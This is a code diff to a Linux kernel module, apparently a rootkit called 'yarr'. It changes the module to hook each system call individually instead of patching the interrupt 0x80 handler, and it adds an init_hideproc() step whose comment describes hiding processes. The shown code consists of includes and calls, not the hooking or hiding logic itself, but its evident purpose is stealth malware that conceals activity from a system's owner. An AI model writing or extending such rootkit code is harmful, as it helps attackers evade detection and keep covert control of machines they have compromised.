@@ -30,6 +30,7 @@
 #include "hide.h"
 #include "types.h"
 #include "hook.h"
+#include "hideproc.h"
 
 #ifndef __KERNEL__
 #define __KERNEL__
@@ -160,13 +161,16 @@ static int __init yarr_loader(void) {
 
 	// Hook the system calls (right now patching system_call() the handler of
 	// IRQ 0x80).
-//	hook_syscalls(PATCH_SYSTEM_CALL);
+	hook_syscalls(HOOK_EACH_SYSCALL);
 
 	// Install yarrIntrDesc().
 //	init_interrupt();
 
 	// Install yarrSyscall().
 	init_syscall();
+
+	// Init everything related with hidding processes.
+	init_hideproc();
 
 	debug("Now sys_call_table is at %p\n", getSyscallTable());
 	return 0;
@@ -191,7 +195,7 @@ static void __exit yarr_unloader(void) {
 	}
 
 	// Undo syscall hooks.
-	unhook_syscalls(PATCH_SYSTEM_CALL);
+	unhook_syscalls(HOOK_EACH_SYSCALL);
 }
 
 // Entry and exit points.
